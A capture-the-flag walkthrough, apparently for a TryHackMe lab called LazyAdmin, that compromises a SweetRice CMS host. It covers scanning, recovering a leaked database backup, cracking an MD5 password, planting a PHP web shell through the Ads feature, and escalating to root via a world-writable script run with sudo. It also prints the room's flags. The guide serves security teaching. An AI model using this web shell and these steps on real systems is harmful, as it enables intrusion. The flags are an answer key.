# LazyAdmin Room - Step-by-Step Solution Guide

## Phase 1: Reconnaissance & Enumeration
1.  **Network Scanning:**
    Start with an Nmap scan to identify open ports and services.
    ```bash
    nmap -sV -sC -oN nmap_scan.txt 10.49.178.216
    ```
    *Results:* Port 22 (SSH) and Port 80 (HTTP) are open.

2.  **Directory Brute Forcing:**
    Use Gobuster to find hidden directories on the web server.
    ```bash
    gobuster dir -u http://10.49.178.216 -w /usr/share/wordlists/dirb/common.txt
    ```
    *Results:* Found `/content`. Enumerating `/content` reveals it is running **SweetRice CMS**.

3.  **Vulnerability Research:**
    Search for known vulnerabilities for SweetRice.
    ```bash
    searchsploit SweetRice
    ```
    *Results:* Several vulnerabilities exist, including backup disclosure and arbitrary file upload.

4.  **Finding Credentials:**
    Check common SweetRice directories for backups.
    ```bash
    curl -s http://10.49.178.216/content/inc/mysql_backup/
    ```
    *Results:* Found `mysql_bakup_20191129023059-1.5.1.sql`. Download and grep for credentials:
    ```bash
    grep -i "INSERT INTO" mysql_bakup_*.sql
    ```
    *Found:* Username: `manager`, MD5 Hash: `42f749ade7f9e195bf475f37a44cafcb`.

5.  **Cracking the Hash:**
    Crack the MD5 hash using John the Ripper or an online tool.
    ```bash
    echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
    john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ```
    *Results:* Password is `Password123`.

---

## Phase 2: Gaining Initial Access
1.  **Access the Admin Panel:**
    Navigate to `http://10.49.178.216/content/as/` and log in with `manager:Password123`.

2.  **Exploit File Upload (Ads Section):**
    SweetRice allows adding "Ads" which are saved as `.php` files in `/content/inc/ads/`.
    *   Go to **Ads**.
    *   Create a new Ad.
    *   **Ad Name:** `shell`
    *   **Ad Code:** `<?php system($_GET['cmd']); ?>`
    *   Save it.

3.  **Trigger the Web Shell:**
    Access your shell at: `http://10.49.178.216/content/inc/ads/shell.php?cmd=whoami`

4.  **Retrieve User Flag:**
    ```bash
    curl "http://10.49.178.216/content/inc/ads/shell.php?cmd=cat+/home/itguy/user.txt"
    ```
    *Flag:* `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## Phase 3: Privilege Escalation
1.  **Enumerate Sudo Privileges:**
    ```bash
    curl "http://10.49.178.216/content/inc/ads/shell.php?cmd=sudo+-l"
    ```
    *Results:* `www-data` can run `/usr/bin/perl /home/itguy/backup.pl` as root without a password.

2.  **Analyze the Script:**
    Examine the contents of `backup.pl`:
    ```bash
    curl "http://10.49.178.216/content/inc/ads/shell.php?cmd=cat+/home/itguy/backup.pl"
    ```
    *Content:* It runs `system("sh", "/etc/copy.sh");`.

3.  **Exploit World-Writable Script:**
    Check permissions of `/etc/copy.sh`:
    ```bash
    curl "http://10.49.178.216/content/inc/ads/shell.php?cmd=ls+-la+/etc/copy.sh"
    ```
    *Results:* It is world-writable (`-rwxr-xrwx`).

4.  **Modify and Execute:**
    Overwrite `/etc/copy.sh` with a command to read the root flag:
    ```bash
    curl "http://10.49.178.216/content/inc/ads/shell.php?cmd=echo+'cat+/root/root.txt'>/etc/copy.sh"
    ```
    Run the backup script with sudo:
    ```bash
    curl "http://10.49.178.216/content/inc/ads/shell.php?cmd=sudo+/usr/bin/perl+/home/itguy/backup.pl"
    ```

5.  **Retrieve Root Flag:**
    *Flag:* `THM{6637f41d0177b6f37cb20d775124699f}`
